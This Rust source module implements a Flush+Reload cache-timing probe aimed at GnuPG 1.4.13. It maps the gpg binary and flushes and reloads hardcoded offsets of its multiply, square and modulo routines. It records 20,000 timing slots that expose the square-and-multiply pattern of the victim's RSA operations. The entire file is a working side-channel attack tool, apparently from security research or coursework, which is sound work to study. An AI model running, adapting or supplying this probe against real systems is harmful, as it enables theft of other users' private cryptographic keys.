extern crate colored;
extern crate libc;
extern crate memmap;
use self::libc::sched_yield;
use self::memmap::Mmap;
use self::memmap::MmapOptions;
use asm;
use colored::*;
use std::fs::File;
use std::io::Write;

pub mod gpg_probe {
    use super::*;
    const MUL_OFFSET: usize = 0x8f67d;
    const SQR_OFFSET: usize = 0x8fc89;
    const MOD_OFFSET: usize = 0x8ed5c;
    const SLOT_TIME: u64 = 2_500;
    const SLOTS: usize = 20_000;
    pub fn probe(threshhold: u32) {
        let mut mul_timings: [u64; SLOTS] = [0; SLOTS];
        let mut sqr_timings: [u64; SLOTS] = [0; SLOTS];
        let mut mod_timings: [u64; SLOTS] = [0; SLOTS];
        let gnupg = File::open("./bin/gpg-1.4.13").unwrap();
        let gpg_mmap = unsafe { MmapOptions::new().map(&gnupg).unwrap() };
        println!(
            "The length of the memory map for GNUGP is {} bytes",
            gpg_mmap.len()
        );
        /*
            wait for threshhold
        */
        loop {
            let mut start_time = asm::get_rdtsc();
            let finish_time = start_time + SLOT_TIME;
            unsafe {
                let mapping_ptr = gpg_mmap.as_ptr();
                let mul_time = asm::full_flush_reload_time(mapping_ptr.add(MUL_OFFSET));
                let sqr_time = asm::full_flush_reload_time(mapping_ptr.add(SQR_OFFSET));
                let mod_time = asm::full_flush_reload_time(mapping_ptr.add(MOD_OFFSET));
                if (mul_time as u32) < threshhold
                    || (sqr_time as u32) < threshhold
                    || (mod_time as u32) < threshhold
                {
                    break;
                }
            }
            start_time = asm::get_rdtsc();
            while start_time < finish_time {
                unsafe { sched_yield() };
                start_time = asm::get_rdtsc();
            }
        }

        for i in 0..SLOTS {
            let mut start_time = asm::get_rdtsc();
            let finish_time = start_time + SLOT_TIME;
            unsafe {
                compute_fr(
                    i,
                    &mut mul_timings,
                    &mut sqr_timings,
                    &mut mod_timings,
                    &gpg_mmap,
                );
            }
            while start_time < finish_time {
                start_time = asm::get_rdtsc();
            }
        }
        print_arr(&mul_timings, &sqr_timings, &mod_timings, threshhold);
    }

    unsafe fn compute_fr(
        iter: usize,
        mul_time: &mut [u64],
        sqr_time: &mut [u64],
        mod_time: &mut [u64],
        mapping: &Mmap,
    ) {
        let mapping_ptr: *const u8 = &mapping[0];
        mul_time[iter] = asm::full_flush_reload_time(mapping_ptr.add(MUL_OFFSET));
        sqr_time[iter] = asm::full_flush_reload_time(mapping_ptr.add(SQR_OFFSET));
        mod_time[iter] = asm::full_flush_reload_time(mapping_ptr.add(MOD_OFFSET));
    }
    fn print_arr(arr: &[u64; SLOTS], arr_1: &[u64; SLOTS], arr_2: &[u64; SLOTS], threshhold: u32) {
        for i in 0..arr.len() {
            let elem: String = format!("{}", arr[i]);
            let elem1: String = format!("{}", arr_1[i]);
            let elem2: String = format!("{}", arr_2[i]);
            let colored_elem: ColoredString;
            let colored_elem1: ColoredString;
            let colored_elem2: ColoredString;
            if arr[i] as u32 > threshhold {
                colored_elem = elem.red();
            } else {
                colored_elem = elem.green();
            }
            if arr_1[i] as u32 > threshhold {
                colored_elem1 = elem1.red();
            } else {
                colored_elem1 = elem1.green();
            }
            if arr_2[i] as u32 > threshhold {
                colored_elem2 = elem2.red();
            } else {
                colored_elem2 = elem2.green();
            }
            println!("{}, {}, {}", colored_elem, colored_elem1, colored_elem2);
        }
    }
    fn print_triplets(arr: u64, arr_1: u64, arr_2: u64, threshhold: u32) {
        let elem: String = format!("{}, {}, {}", arr, arr_1, arr_2);
        let colored_elem: ColoredString;
        if arr as u32 > threshhold && arr_1 as u32 > threshhold && arr_2 as u32 > threshhold {
            colored_elem = elem.red();
        } else {
            colored_elem = elem.green();
            println!("{}", colored_elem);
        }
    }
}
